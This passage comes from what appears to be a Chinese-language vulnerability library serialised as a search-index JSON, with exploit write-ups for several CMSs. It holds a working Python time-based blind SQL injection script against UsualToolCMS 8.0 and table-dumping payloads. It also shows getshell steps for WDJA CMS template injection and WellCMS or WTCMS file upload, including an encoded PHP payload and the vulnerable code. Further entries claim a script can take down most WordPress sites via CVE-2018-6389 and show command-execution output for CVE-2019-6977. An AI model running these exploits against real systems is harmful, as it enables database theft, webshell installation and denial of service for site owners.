list('root@localhostasfafsasf')\nurl = 'http://192.168.8.108:8081/UsualToolCMS-8.0-Release/cmsadmin/a_login.php?do=login'\nresponse = session.post(url=url,headers=headers,data=data)\nres_url_1 = \"http://192.168.8.108:8081/UsualToolCMS-8.0-Release/cmsadmin/a_templetex.php?t=open&amp;id=1&amp;paths=templete/index' where id=1 and if(ascii(substring(user(),{},1))={},sleep(5),1)--+\"\nresult = ''\nfor i in range(1,15):\n    for payload in payloads:\n        res_url_2 = res_url_1.format(str(i),ord(payload))\n        start_time = time.time()\n        response = session.get(url=res_url_2,headers=headers)\n        if time.time() - start_time &gt; 7:\n            result = result + payload\n            print(result)\n            break\n</code></pre> <p>\u7206\u6570\u636e\u5e93\u8868payload\uff1a</p> <pre><code>Copya_templetex.php?t=open&amp;id=1&amp;paths=templete/index' where id=1 and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;0,sleep(5),1)--+\n</code></pre> <p></p> <p>----------------------------------------------------------------------------</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/WDJACMS/WDJACMS1.5.2%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","title":"WDJACMS1.5.2\u6a21\u677f\u6ce8\u5165\u6f0f\u6d1e","text":"<p>WDJA CMS 1.5.2\u6a21\u677f\u6ce8\u5165\u6f0f\u6d1e \u6f0f\u6d1e\u53d1\u6398\u5206\u6790 \u524d\u8a00 \u8fd9\u662f\u5e74\u521d\u65e0\u804a\u5728\u5bb6\u5ba1\u7684\u4e00\u4e2a\u5c0f\u4f17\u7684CMS\uff0c\u6f0f\u6d1e\u5b98\u65b9\u5df2\u7ecf\u4fee\u590d\uff0c\u73b0\u5728\u5206\u4eab\u51fa\u6765\u7ed9\u5927\u5bb6\uff0c\u5e0c\u671b\u4e00\u8d77\u5171\u540c\u5b66\u4e60\u548c\u8fdb\u6b65\u3002 \u4ee3\u7801\u5ba1\u8ba1 <code>\u6f0f\u6d1e\u6587\u4ef6\uff1a\\common\\incfiles\\function.inc.php</code> \u5168\u5c40\u641c\u7d22\u4e2d\u53d1\u73b0\u8fd9\u4e2acms\u7684\u6a21\u677f\u5f15\u64ce\u662f\u4f7f\u7528eval\u6765\u5b9e\u73b0\u7684\u3002  \u6211\u4eec \u8ddf\u8fdb<code>ii_eval()</code>\u51fd\u6570\u3002\u975e\u5e38\u8fd9\u91cc<code>$strers</code>\u53ef\u63a7\u7591\u4f3c\u5b58\u5728\u4ee3\u7801\u6267\u884c\u3002\u6211\u4eec\u5728\u7ee7\u7eed\u8ddf\u8fdb<code>ii_eval()</code>\u770b\u8c01\u8c03\u7528\u4e86\u4ed6\u3002  <code>\u6f0f\u6d1e\u6587\u4ef6\uff1a\\common\\incfiles\\function.inc.php</code> \u53ea\u6709\u4e00\u4e2a\u5730\u65b9\u5bf9\u4ed6\u8fdb\u884c\u4e86\u8c03\u7528\uff0c\u4ed6\u662f<code>ii_creplace()</code>\u51fd\u6570  \u6211\u4eec\u770b<code>ii_creplace()</code>\u4ee3\u7801\uff0c<code>$strers</code>\u53ef\u63a7\uff0c\u4f46\u662f\u5b83\u5fc5\u987b\u5339\u914d<code>({\\$=(.[^\\}]*)})</code>\u8fd9\u4e2a\u6b63\u5219\u7c7b\u4f3c\u4e8e\u4e0b\u9762\uff1a <code>{$=phpinfo()}</code> <code>\u6f0f\u6d1e\u6587\u4ef6passport\\address\\common\\incfiles\\manage_config.inc.php</code> \u90a3\u4e48\u6211\u4eec\u7ee7\u7eed\u8ddf\u8fdb<code>ii_creplace()</code>\u51fd\u6570\u770b\u8c01\u5bf9\u4ed6\u8fdb\u884c\u4e86\u8c03\u7528\uff0c\u627e\u4e86\u5f88\u591a\u4f46\u662f\u90fd\u5bf9\u51fd\u6570\u4e2d\u7684<code>$</code>\u8fdb\u884c\u4e86\u8f6c\u4e49\uff0c\u4f46\u662f\u5728<code>passport\\address\\common\\incfiles\\manage_config.inc.php</code>\u4e2d\u7684<code>wdja_cms_admin_manage_list()</code>\u5e76\u672a\u505a\u4efb\u4f55\u8fc7\u6ee4\u3002\u6211\u4eec\u7ee7\u7eed\u8ddf\u8fdb\u3002  \u6211\u4eec\u53d1\u73b0<code>\\passport\\address\\manage.php</code>\u5bf9<code>passport\\address\\common\\incfiles\\manage_config.inc.php</code>\u8fdb\u884c\u4e86\u5305\u542b\u5e76\u8c03\u7528\u4e86<code>wdja_cms_admin_manage_action()</code>,\u800c\u5b83\u8c03\u7528\u4e86<code>wdja_cms_admin_manage_list()</code>,\u90a3\u4e48\u5f88\u660e\u663e\u6211\u4eec\u53ea\u9700\u5c06\u7b26\u5408<code>{\\$=(.[^\\}]*)}</code>\u6b63\u5219\u7684payload\u4f20\u5165\u5373\u53ef\u5bfc\u81f4getshell.  \u90a3\u4e48\u4ece\u54ea\u4f20\u5165\u5462\uff0c\u6211\u4eec\u76f4\u63a5\u628a<code>wdja_cms_admin_manage_list()</code>\u4e2d\u7684sql\u8bed\u53e5\u6253\u5370\u51fa\u6765\u5373\u53ef\u77e5\u9053\u3002   \u5f88\u660e\u663e\u662f\u4ece\u7528\u6237\u5730\u5740\u4e2d\u83b7\u53d6\u3002  Getshell \u5148\u6ce8\u518c\u4e00\u4e2a\u4f1a\u5458 <code>http://www.\u57df\u540d.com/passport/?type=register</code> \u5728\u6dfb\u52a0\u5730\u5740\u51fa\u5199\u5165\u8981\u6ce8\u5165\u7684\u547d\u4ee4,\u786e\u8ba4\u6dfb\u52a0\u5730\u5740\u5373\u53ef\u3002 <code>http://www.\u57df\u540d.com/passport/address/index.php?type=list</code>  getshell exp,\u540c\u6837\u65b9\u6cd5\u5728\u5730\u5740\u51fa\u5199\u5165\u4e0b\u9762\u4ee3\u7801\u5373\u53ef\u5728<code>passport\\address</code>\u8def\u5f84\u4e0b\u751f\u6210\u4e00\u4e2ashell.php  </p> <p>\u672c\u4e3b\u9898\u7531 \u6751\u957fCZ \u4e8e 2020-11-17 18:53 \u6dfb\u52a0\u56fe\u7ae0 100\u5143\u5956\u91d1</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/WTCMS/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/","title":"\u6587\u4ef6\u4e0a\u4f20getshell","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/WTCMS/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/#_1","title":"\u6f0f\u6d1e\u8be6\u60c5\uff1a","text":"<p>1\u3001\u767b\u5f55\u540e\u53f0\u540e\uff0c\u8fdb\u5165\u6ce8\u518c\u90ae\u4ef6\u6a21\u677f\u529f\u80fd  2\u3001\u4f7f\u7528\u7f16\u8f91\u5668\u4e0a\u4f20\u4e00\u5f20\u56fe\u7247\uff0c\u5e76\u6293\u5305\u4fee\u6539\u6587\u4ef6\u540d\u53ca\u6587\u4ef6\u5185\u5bb9   3\u3001\u8bbf\u95ee\u4e0a\u4f20\u7684php\u6587\u4ef6 </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/WTCMS/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/#_2","title":"\u53c2\u8003\u94fe\u63a5","text":"<p>https://xz.aliyun.com/t/4234</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/WellCMS/WellCMS%202.0%20Beta3%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","title":"WellCMS 2.0 Beta3 \u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/WellCMS/WellCMS%202.0%20Beta3%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#wellcms","title":"WellCMS","text":"<p>WellCMS\u662f\u4e00\u6b3e\u5f00\u6e90\u3001\u503e\u5411\u79fb\u52a8\u7aef\u7684\u8f7b\u91cf\u7ea7CMS\uff0c\u9ad8\u8d1f\u8f7dCMS\uff0c\u4ebf\u4e07\u7ea7CMS\uff0c\u662f\u5927\u6570\u636e\u91cf\u3001\u9ad8\u5e76\u53d1\u8bbf\u95ee\u7f51\u7ad9\u6700\u4f73\u9009\u62e9\u7684\u8f7bCMS\u3002\u767b\u9646\u8be5CMS\u540e\u53f0\uff0c\u67d0\u56fe\u7247\u4e0a\u4f20\u5904\uff0c\u7531\u4e8e\u4e0a\u4f20\u6587\u4ef6\u7c7b\u578b\u53ef\u63a7\uff0c\u53ef\u4fee\u6539\u4e0a\u4f20\u6587\u4ef6\u7c7b\u578b\u83b7\u53d6webshell\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/WellCMS/WellCMS%202.0%20Beta3%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_1","title":"\u590d\u73b0\u8fc7\u7a0b","text":"<p>\u7b2c\u4e00\u6b65\uff0c\u767b\u9646\u8be5CMS\u540e\u53f0\uff1a</p> <p></p> <p>\u7b2c\u4e8c\u6b65\uff0c\u8fdb\u5165\u201c\u540e\u53f0\u7ba1\u7406\u201c\uff0c\u5b9a\u4f4d\u5229\u7528\u70b9\uff0c\u70b9\u51fb\u4e0b\u56fe\u7ea2\u6846\u4e2d\u56fe\u7247\u8fdb\u884c\u4e0a\u4f20\uff1a </p> <p>\u4e0a\u4f20\u5e76\u6293\u53d6\u6570\u636e\u5305\uff1a </p> <p>\u7b2c\u4e09\u6b65\uff0c\u4fee\u6539post\u5305\u4e2d\u201cfiletype\u201d\u53c2\u6570\u7c7b\u578b\u4e3a\u201cphp\u201d\uff1b\u7ecf\u5206\u6790 \u201cdata\u201d\u53c2\u6570\u4e3abase64\u52a0\u5bc6\uff0c\u8fd9\u91cc\u6211\u4eec\u5c06\u6d4b\u8bd5\u6570\u636e\u201c&lt;?php phpinfo();?&gt;\u201d\u7ecf\u8fc7base64\u52a0\u5bc6\u7b49\u6784\u9020\uff0c\u5f62\u6210\u201cdata\u201d\u53c2\u6570\u7684\u6570\u636e\uff1adata%3Aimage%2Fjpeg%3Bbase64%2CPD9waHAgcGhwaW5mbygpOz8%2B\uff0c\u6700\u540e\u6570\u636e\u5305\u653e\u884c\uff0c\u8fd4\u56de\u6210\u529f\u4e0a\u4f20\u4e3aphp\u6587\u4ef6\u7684\u8def\u5f84\uff1a </p> <p>\u6700\u540e\uff0c\u5c1d\u8bd5\u8bbf\u95ee\uff0c\u6210\u529f\uff1a </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/WellCMS/WellCMS%202.0%20Beta3%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_2","title":"\u6e90\u7801\u5206\u6790","text":"<p>\u6839\u636e\u6f0f\u6d1e\u5b9a\u4f4d\u4ee3\u7801\u6587\u4ef6\uff1aroute/attach.php\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a if ($action == 'create') {</p> <pre><code>// hook attach_create_start.php\nuser_login_check();\n// hook attach_create_check_after.php\n$backstage = param(2, 0);\n$width = param('width', 0);\n$height = param('height', 0);\n$is_image = param('is_image', 0); // \u56fe\u7247\n$name = param('name');\n$data = param_base64('data');\n$mode = param('mode', 0); // \u4e0a\u4f20\u7c7b\u578b 1\u4e3b\u56fe\n$filetype = param('filetype'); // \u538b\u7f29\u56fe\u7247\u540e\u7f00jpeg jpg png\u7b49\n$convert = param('convert', 0); // \u56fe\u7247\u8f6c\u6362\u538b\u7f29 = 1\n$n = param('n', 0); // \u5bf9\u5e94\u4e3b\u56fe\u8d4b\u503c\n$type = param('type', 0); // type = 0\u5219\u6309\u7167SESSION\u6570\u7ec4\u9644\u4ef6\u6570\u91cf\u7edf\u8ba1\uff0ctype = 1\u5219\u6309\u7167\u4f20\u5165\u7684n\u6570\u503c\n// hook attach_create_before.php\n// \u5141\u8bb8\u7684\u6587\u4ef6\u540e\u7f00\u540d\n//$types = include _include(APP_PATH.'conf/attach.conf.php');\n//$allowtypes = $types['all'];\nempty($group['allowattach']) AND $gid != 1 AND message(2, '\u60a8\u65e0\u6743\u4e0a\u4f20');\n// hook attach_create_center.php\nempty($data) AND message(1, lang('data_is_empty'));\n//$data = base64_decode_file_data($data);\n$size = strlen($data);\n$size &gt; 20480000 AND message(1, lang('filesize_too_large', array('maxsize' =&gt; '20M', 'size' =&gt; $size)));\n// hook attach_create_file_ext_start.php\n// \u83b7\u53d6\u6587\u4ef6\u540e\u7f00\u540d 111.php.shtmll\n$ext = file_ext($name, 7);\n$filetypes = include APP_PATH . 'conf/attach.conf.php';\n// hook attach_create_file_ext_before.php\n//\u4e3b\u56fe\u5fc5\u987b\u4e3a\u56fe\u7247\nif ($is_image == 1 &amp;&amp; $mode == 1 &amp;&amp; !in_array($ext, $filetypes['image'])) message(1, lang('well_up_picture_error'));\n// hook attach_create_file_ext_center.php\n// \u5982\u679c\u6587\u4ef6\u540e\u7f00\u4e0d\u5728\u89c4\u5b9a\u8303\u56f4\u5185 \u6539\u53d8\u540e\u7f00\u540d\n//!in_array($ext, $filetypes['all']) AND $ext = '_' . $ext;\nif (!in_array($ext, $filetypes['all'])) {\n    $ext = '_' . $ext;\n} else {\n    // CMS\u4e0a\u4f20\u56fe\u7247\n    $t == 1 AND $convert == 1 AND $is_image == 1 AND $ext = $filetype;\n}\n// hook attach_create_file_ext_after.php\n$tmpanme = $uid . '_' . xn_rand(15) . '.' . $ext;\n// hook attach_create_tmpanme_after.php\n$tmpfile = $conf['upload_path'] . 'tmp/' . $tmpanme;\n// hook attach_create_tmpfile_after.php\n$tmpurl = $conf['upload_url'] . 'tmp/' . $tmpanme;\n// hook attach_create_tmpurl_after.php\n$filetype = attach_type($name, $filetypes);\n// hook attach_create_save_before.php\nfile_put_contents($tmpfile, $data) OR message(1, lang('write_to_file_failed'));\n// hook attach_create_save_after.php\n// \u4fdd\u5b58\u5230 session\uff0c\u53d1\u5e16\u6210\u529f\u4ee5\u540e\uff0c\u5173\u8054\u5230\u5e16\u5b50\u3002\n// save attach information to session, associate to post after create thread.\n// \u629b\u5f03\u4e4b\u524d\u7684 $_SESSION \u6570\u636e\uff0c\u91cd\u65b0\u542f\u52a8 session\uff0c\u964d\u4f4e session \u5e76\u53d1\u5199\u5165\u7684\u95ee\u9898\n// Discard the previous $_SESSION data, restart the session, reduce the problem of concurrent session write\nsess_restart();\nempty($t) AND empty($_SESSION['tmp_files']) AND $_SESSION['tmp_files'] = array();\n$t == 1 AND empty($_SESSION['tmp_website_files']) AND $_SESSION['tmp_website_files'] = array();\n// hook attach_create_after.php\n// type = 0\u5219\u6309\u7167SESSION\u6570\u7ec4\u9644\u4ef6\u6570\u91cf\u7edf\u8ba1\uff0ctype = 1\u5219\u6309\u7167\u4f20\u5165\u7684n\u6570\u503c\nempty($type) AND $n = ($t == 1) ? count($_SESSION['tmp_website_files']) : count($_SESSION['tmp_files']);\n$filesize = filesize($tmpfile);\n$attach = array(\n    'backstage' =&gt; $backstage, // 0\u524d\u53f0 1\u540e\u53f0\n    'url' =&gt; $backstage ? '../' . $tmpurl : '' . $tmpurl,\n    'path' =&gt; $tmpfile,\n    'orgfilename' =&gt; $name,\n    'filetype' =&gt; $filetype,\n    'filesize' =&gt; $filesize,\n    'width' =&gt; $width,\n    'height' =&gt; $height,\n    'isimage' =&gt; $is_image,\n    'downloads' =&gt; 0,\n    'aid' =&gt; '_' . $n\n);\n// hook attach_create_array_after.php\nif ($mode == 1) {\n    // hook attach_create_thumbnail_beofre.php\n    $_SESSION['tmp_thumbnail'] = $attach;\n    // hook attach_create_thumbnail_after.php\n} else {\n    // hook attach_create_website_files_beofre.php\n    // 0 BBS 1 CMS\n    $t == 1 ? $_SESSION['tmp_website_files'][$n] = $attach : $_SESSION['tmp_files'][$n] = $attach;\n    // hook attach_create_website_files_after.php\n}\n// hook attach_create_session_after.php\nunset($attach['path']);\n// hook attach_create_end.php\nmessage(0, $attach);\n</code></pre> <p>\u5927\u81f4\u6d41\u7a0b\uff1a</p> <p>1\u3001 \u9996\u5148\uff0c\u63a5\u53d7\u76f8\u5173\u53c2\u6570\uff0c\u5c06filetype\u81ea\u884c\u8bbe\u7f6e\u6210\u201cphp\u201d\uff1a</p> <pre><code>$data = param_base64('data');\n$filetype = param('filetype'); /\n</code></pre> <p>2\u3001 \u8fdb\u884c\u903b\u8f91\u5224\u65ad\uff1a</p> <p>if (!in_array($ext, $filetypes['all'])) {</p> <pre><code>    $ext = '_' . $ext;\n} else {\n    // CMS\u4e0a\u4f20\u56fe\u7247\n    $t == 1 AND $convert == 1 AND $is_image == 1 AND $ext = $filetype;\n}\n</code></pre> <p>3\u3001 \u6700\u540e\u6210\u529f\u5199\u5165\uff1a</p> <p>$tmpanme = $uid . '_' . xn_rand(15) . '.' . $ext;</p> <pre><code>// hook attach_create_tmpanme_after.php\n$tmpfile = $conf['upload_path'] . 'tmp/' . $tmpanme;\n// hook attach_create_tmpfile_after.php\n$tmpurl = $conf['upload_url'] . 'tmp/' . $tmpanme;\n// hook attach_create_tmpurl_after.php\n$filetype = attach_type($name, $filetypes);\n// hook attach_create_save_before.php\nfile_put_contents($tmpfile, $data) OR message(1, lang('write_to_file_failed'));\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2018-6389/","title":"CVE-2018-6389 Wordpress Exploit","text":"<p>CVE-2018-6389 Exploit Can Down Any Wordpress site under 4.9.3  The flaw affects the load-scripts.php WordPress script, it receives a parameter called load[] </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2018-6389/#about-poc","title":"About PoC","text":"<p>A simple Script In Python With threading could allow anyone to take down most WordPress websites with single machine</p> <p>\u811a\u672cgithub\u83b7\u53d6</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2018-6389/#info","title":"Info","text":"<p>Can Down Any Website with Tested Wordpress versions  * Tested : WordPress (Version 4.9.2)  * Tested : WordPress (Version 4.9.1)</p> <pre><code>Note : I Am Not The Author Of the Exploit \n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2018-6389/#ref","title":"Ref","text":"<ul> <li>PoC - Youtube</li> <li> Barak Tawily  - Blog</li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2019-6977-imagecolormatch/","title":"imagecolormatch() OOB Heap Write exploit","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2019-6977-imagecolormatch/#info","title":"Info","text":"<p>My binary exploit for CVE-2019-6977. Bug found by Simon Scannell from RIPS.</p> <p>PHP bug is here. Helps you bypass PHP's <code>disable_functions</code> INI directive.</p> <p>I commented a lot to help people that are new to binary PHP exploitation. Hope this helps.</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2019-6977-imagecolormatch/#output","title":"Output","text":"<p><pre><code>GET http://target.com/exploit.php?f=0x7fe83d1bb480&amp;c=id+&gt;+/dev/shm/titi\n</code></pre> <pre><code>Nenuphar.ce: 0x7fe834a10018\nNenuphar2.ce: 0x7fe834a10d70\nNenuphar.properties: 0x7fe834a01230\nz.val: 0x7fe834aaea18\nDifference: 0xad7e8\n\nExploit SUCCESSFUL !\n</code></pre></p> <p>From:https://github.com/cfreal/exploits/tree/master/CVE-2019-6977-imagecolormatch</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2019-6977-wordpress5.0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","title":"imagecolormatch() OOB Heap Write exploit","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2019-6977-wordpress5.0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#info","title":"Info","text":"<p>My binary exploit for CVE-2019-6977. Bug found by Simon Scannell from RIPS.</p> <p>PHP bug is here. Helps you bypass PHP's <code>disable_functions</code> INI directive.</p> <p>I commented a lot to help people that are new to binary PHP exploitation. Hope this helps.</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2019-6977-wordpress5.0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#output","title":"Output","text":"<p><pre><code>GET http://target.com/exploit.php?f=0x7fe83d1bb480&amp;c=id+&gt;+/dev/shm/titi\n</code></pre> <pre><code>Nenuphar.ce: 0x7fe834a10018\nNenuphar2.ce: 0x7fe834a10d70\nNenuphar.properties: 0x7fe834a01230\nz.val: 0x7fe834aaea18\nDifference: 0xad7e8\n\nExploit SUCCESSFUL !\n</code></pre></p> <p>From:https://github.com/cfreal/exploits/tree/master/CVE-2019-6977-imagecolormatch</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.4_SSRF/","title":"WordPress_4.4_SSRF","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.4_SSRF/#official","title":"Official","text":"<p>https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.4_SSRF/#affected-version","title":"Affected Version","text":"<p>WordPress &lt;= 4.5</p> <p>github\u83b7\u53d6</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.4_SSRF/#poc","title":"PoC","text":"<p>\u6ce8\u610f\uff1a \u5916\u7f51 SSRF 4.4.1 4.4.2 \u5747\u6d4b\u8bd5\u901a\u8fc7\uff0c\u5185\u7f51\u6d4b\u8bd5\u5931\u8d25\u3002</p> <p></p> <p>DNGLog\u8bb0\u5f55\uff1a</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.4_SSRF/#references","title":"References","text":"<ol> <li>http://xlab.baidu.com/wordpress/</li> <li>http://blog.csdn.net/cd_xuyue/article/details/52276443</li> </ol>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.7.0-4.7.1_%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%85%E5%AE%B9%E6%B3%A8%E5%85%A5/","title":"WordPress_4.7.0-4.7.1_\u672a\u6388\u6743\u5185\u5bb9\u6ce8\u5165","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.7.0-4.7.1_%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%85%E5%AE%B9%E6%B3%A8%E5%85%A5/#affected-version","title":"Affected Version","text":"<ul> <li> <p>WordPress 4.7.0</p> </li> <li> <p>WordPress 4.7.1</p> </li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.7.0-4.7.1_%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%85%E5%AE%B9%E6%B3%A8%E5%85%A5/#poc","title":"PoC","text":"<p>\u6ce8\u610f\uff1a \u4ece\u5b98\u7f51\u4e0b\u8f7d\u76f8\u5e94\u6f0f\u6d1e\u7248\u672c\u540e\uff0c\u9700\u8981\u5728\u65ad\u7f51\u72b6\u6001\u4e0b\u8fdb\u884c\u5b89\u88c5\u6d4b\u8bd5\uff0c\u5426\u5219\u9ed8\u8ba4\u4f1a\u81ea\u52a8\u66f4\u65b0\u4fee\u590d\u8be5\u6f0f\u6d1e\u3002</p> <p>github\u83b7\u53d6\u811a\u672c</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.7.0-4.7.1_%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%85%E5%AE%B9%E6%B3%A8%E5%85%A5/#references","title":"References","text":"<ol> <li> <p>https://www.exploit-db.com/exploits/41223/</p> </li> <li> <p>http://paper.seebug.org/208/</p> </li> </ol>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.7_Info_Disclosure/","title":"WordPress_4.7_Info_Disclosure","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.7_Info_Disclosure/#official","title":"Official","text":"<p>https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.7_Info_Disclosure/#affected-version","title":"Affected Version","text":"<p>WordPress 4.7 (4.7.1 fixed)</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.7_Info_Disclosure/#poc","title":"PoC","text":"<p>github\u83b7\u53d6\u811a\u672c</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.7_Info_Disclosure/#references","title":"References","text":"<ol> <li>https://wpvulndb.com/vulnerabilities/8715</li> </ol>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%204.9.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/","title":"0x01 Wordpress\u7b80\u4ecb","text":"<p>WordPress\u662f\u7f51\u7edc\u4e0a\u6700\u53d7\u6b22\u8fce\u7684CMS\u3002\u6839\u636e*w3tech*\uff0c\u5927\u7ea630\uff05\u7684\u7f51\u7ad9\u4f7f\u7528\u5b831\u3002\u8fd9\u79cd\u5e7f\u6cdb\u7684\u91c7\u7528\u4f7f\u5176\u6210\u4e3a\u7f51\u7edc\u7f6a\u72af\u7684\u4e00\u4e2a\u6709\u8da3\u76ee\u6807\u3002\u5728\u8fd9\u7bc7\u535a\u6587\u4e2d\uff0c\u6211\u4eec\u5c06\u4ecb\u7ecdWordPress\u6838\u5fc3\u4e2d\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u53ef\u80fd\u5bfc\u81f4\u653b\u51fb\u8005\u6267\u884c\u4efb\u610f\u4ee3\u7801\u30027\u4e2a\u6708\u524d\uff0c\u8be5\u6f0f\u6d1e\u5df2\u62a5\u544a\u7ed9WordPress\u5b89\u5168\u56e2\u961f\uff0c\u4f46\u4ecd\u672a\u4fee\u8865\u3002\u81ea\u9996\u6b21\u62a5\u544a\u4ee5\u6765\u5df2\u7ecf\u8fc7\u53bb\u5f88\u957f\u65f6\u95f4\u6ca1\u6709\u4efb\u4f55\u8865\u4e01\u6216\u5177\u4f53\u8ba1\u5212\uff0c\u8fd9\u4f7f\u6211\u4eec\u51b3\u5b9a\u5c06\u5176\u516c\u4e4b\u4e8e\u4f17\u3002</p> <p>0x02 \u6f0f\u6d1e\u5206\u6790</p> <p>\u8fd1\u65e5RIPS\u56e2\u961f ( \u4f5c\u8005\uff1aKarim El Ouerghemmi ) \u516c\u5f00\u4e86\u4e00\u4e2aWordpress\u7684\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e\uff08\u9700\u8981\u767b\u5f55\uff09\uff0c\u76ee\u524d\u8be5\u6f0f\u6d1e\u4ecd\u7136\u672a\u4fee\u590d\uff082018\u5e7406\u670827\u65e5\uff09\uff0c\u8be5\u6f0f\u6d1e\u5f71\u54cd Wordpress \u6700\u65b0\u7248 4.9.6.</p> <p>\u6587\u4ef6wp-includes/post.php\u4e2d\uff1a</p> <p></p> <pre><code>function wp_delete_attachment( $post_id, $force_delete = false ) {\n    ...\n    $meta = wp_get_attachment_metadata( $post_id );\n    ...\n    if ( ! empty($meta['thumb']) ) {\n        // Don't delete the thumb if another attachment 